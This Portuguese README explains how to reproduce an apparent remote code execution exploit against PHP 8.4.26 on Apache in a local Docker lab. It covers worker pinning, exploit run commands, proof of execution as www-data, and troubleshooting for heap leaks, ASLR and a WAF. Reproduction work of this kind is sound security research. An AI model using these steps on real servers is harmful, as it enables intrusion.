# Como reproduzir

## 1. Preparar o alvo

Use uma imagem **Debian** `php:<versão>-apache` (mod_php). Monte:

| Host | Container | Modo |
|:--|:--|:--|
| `target/php.ini` | `/usr/local/etc/php/php.ini` | ro |
| `target/apache.conf` | `/etc/apache2/conf-enabled/zz-prod.conf` | ro |
| `target/www` | `/var/www/html` | ro |
| `out/` | `/out` | rw |

O `apache.conf` usa prefork com `MaxRequestWorkers 150`; o `run.js` usa 149
conexões bloqueadoras para manter A1/B1/A2/B2 no mesmo worker.

## 2. Executar

```bash
mkdir -p out
docker run -d --name p2s-8426 -p 19300:80 \
  -v "$PWD/target/php.ini:/usr/local/etc/php/php.ini:ro" \
  -v "$PWD/target/apache.conf:/etc/apache2/conf-enabled/zz-prod.conf:ro" \
  -v "$PWD/target/www:/var/www/html:ro" \
  -v "$PWD/out:/out" \
  php:8.4.26-apache

./run.js --version 8.4.26 --host 127.0.0.1 --port 19300 \
  --proof out/p1 --cmd 'id>/out/p1'
```

O `--proof` é o caminho **no host do operador**; o comando escreve em `/out/p1`
dentro do alvo, que é o mesmo volume.

## 3. Critério de sucesso

```bash
cat out/p1
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Sem essa linha, **não** houve execução, mesmo que o motor imprima algo.

## 4. Diagnóstico

| Sintoma | Causa provável | Ação |
|:--|:--|:--|
| `leak failed: no heap pointers` | B1 não vazou; heap/ASLR | reinicie o container e repita |
| `no proof` / arquivo vazio | stage 3 não executou | confira `s_off` do perfil |
| HTTP 403 | WAF/proxy na frente | teste direto no Apache |
| HTTP 500 constante | `memory_limit` alto demais | use o `target/php.ini` |
| versão errada | tag da imagem | confira `php -v` no container |

## 5. Repetir a matriz

Reinicie o alvo antes de cada tentativa e apague a prova:

```bash
docker restart p2s-8426
rm -f out/p1
```

